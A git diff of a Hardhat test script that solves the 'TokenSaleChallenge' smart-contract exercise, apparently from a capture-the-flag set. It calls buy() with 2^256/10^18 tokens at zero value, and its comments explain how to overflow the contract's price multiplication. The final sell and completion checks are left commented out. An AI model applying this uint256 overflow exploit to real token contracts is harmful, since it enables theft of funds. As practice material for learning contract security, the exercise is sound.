@@ -6,7 +6,7 @@ import { expect } from "chai";
 
 let accounts: Signer[];
 let eoa: Signer;
-let challengeContract: Contract;
+let contract: Contract; // challenge contract
 
 before(async () => {
   accounts = await ethers.getSigners();
@@ -14,36 +14,21 @@ before(async () => {
   const challengeFactory = await ethers.getContractFactory(
     "TokenSaleChallenge"
   );
-  challengeContract = challengeFactory.attach(
+  contract = challengeFactory.attach(
     `0x56E9615787Fde82f3C68b572f68e2bC6C1866918`
   );
 });
 
 it("solves the challenge", async function () {
-
-  const oneToken = BigNumber.from(1);
-  const ONE_ETHER = BigNumber.from(`10`).pow(`18`);
-
-  await challengeContract.buy(oneToken.div(ONE_ETHER), {
-    value: oneToken.div(ONE_ETHER)
-  });
-
-  const balance: BigNumber = await challengeContract.balanceOf(await eoa.getAddress());
-  console.log(`balance`, balance.toString());
-
-  const tx = await challengeContract.sell(`1`);
-
-  const isComplete = await challengeContract.isComplete();
-  expect(isComplete).to.be.true;
   // we want an overflow in this line of the contract:
-  // // uint256 = numTokens * 1 ether = numTokens * 10 ^ 18
-  // // when x is the amount of tokens we will receive (input to buy)
-  // // then we need to pay ceil(x / 10^18) * 10^18 mod 2^256 (overflow amount) in value
-  // // try to minimize this payment value for x >= 2^256 (when overflow happens)
-  // // not sure how to do it analytically, but we can just start with x = 2^256
-  // // as 2^256 and 10^18 = (2*5)^18 = 2^18*5^18, multiplying by prime 3 should
-  // // give us a good cycle to check for min value
-  // const ONE_ETHER = BigNumber.from(`10`).pow(`18`);
+  // uint256 = numTokens * 1 ether = numTokens * 10 ^ 18
+  // when x is the amount of tokens we will receive (input to buy)
+  // then we need to pay ceil(x / 10^18) * 10^18 mod 2^256 (overflow amount) in value
+  // try to minimize this payment value for x >= 2^256 (when overflow happens)
+  // not sure how to do it analytically, but we can just start with x = 2^256
+  // as 2^256 and 10^18 = (2*5)^18 = 2^18*5^18, multiplying by prime 3 should
+  // give us a good cycle to check for min value
+  const ONE_ETHER = BigNumber.from(`10`).pow(`18`);
   // const computePayment = (x: BigNumber) => {
   //   // there's a remainder that is cut off, need to increase division result by 1
   //   let toBuy = x.div(ONE_ETHER).add(`1`);
@@ -70,14 +55,20 @@ it("solves the challenge", async function () {
   //   if(result.toPay.lt(bestPair.toPay)) {
   //     bestPair = result
   //   }
-  //}
+  // }
 
   // console.log(`buying`, bestPair.toBuy.toString());
   // console.log(`paying`, ethers.utils.formatEther(bestPair.toPay), `ETH`);
 
-  // await challengeContract.buy(bestPair.toBuy.toString(), {
-  //   value: bestPair.toPay.toString(),
-  // });
+  await contract.buy(BigNumber.from(`2`).pow(`256`).div(ONE_ETHER), {
+    value: 0,
+  });
 
+  const balance: BigNumber = await contract.balanceOf(await eoa.getAddress());
+  console.log(`balance`, balance.toString());
 
+  // const tx = await contract.sell(`1`);
+
+  // const isComplete = await contract.isComplete();
+  // expect(isComplete).to.be.true;
 });
